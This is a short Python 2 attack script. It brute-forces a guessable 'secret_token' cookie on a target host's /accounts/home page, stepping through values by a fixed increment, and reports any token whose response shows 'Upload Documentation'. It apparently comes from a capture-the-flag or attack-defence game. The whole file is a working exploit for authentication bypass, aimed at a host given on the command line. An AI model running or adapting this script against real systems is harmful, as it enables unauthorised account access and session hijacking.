import requests
import subprocess
import sys

host = sys.argv[1]
j = int(sys.argv[2])
http = sys.argv[3]


url1 = http+"://"+host+"/accounts/home"

token = 268337
i = 0
while(i < j):
	try:
		cookies = {'secret_token' : str(token)}
		r = requests.post(url1, cookies=cookies,verify=False)
	except:
		print "Error with: "+url1
	if("Upload Documentation" in str(r.text)):
		print "Found Cookie("+host+"): "+str(token)
		#r.cookies.clear()

	token += 14123
	i += 1
